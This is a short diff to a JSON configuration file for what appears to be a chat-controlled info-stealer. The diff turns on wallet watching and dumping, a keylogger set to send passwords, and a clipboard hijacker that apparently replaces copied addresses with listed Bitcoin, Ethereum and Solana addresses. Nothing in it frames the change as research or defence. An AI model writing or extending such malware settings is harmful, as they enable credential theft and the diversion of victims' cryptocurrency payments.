@@ -4,5 +4,27 @@
   "categoryId": "1567284372657410169",
   "allowedUsers": [
     "1523678293956759736"
-  ]
+  ],
+  "wallets": {
+    "watch": true,
+    "dumpCooldownSec": 600
+  },
+  "keylogger": {
+    "enabled": true,
+    "sendPasswords": true
+  },
+  "clipboard": {
+    "enabled": true,
+    "coins": {
+      "btc": [
+        "bc1qqypqxpq9qcrsszg2pvxq6rs0zqg3yyc5fcj4z3"
+      ],
+      "eth": [
+        "0x52908400098527886E0F7030069857D2E4169EE7"
+      ],
+      "sol": [
+        "4vJ9JU1bJJE96FWSJKvHsmmFADCg4gpZQff4P3bkLKi"
+      ]
+    }
+  }
 }
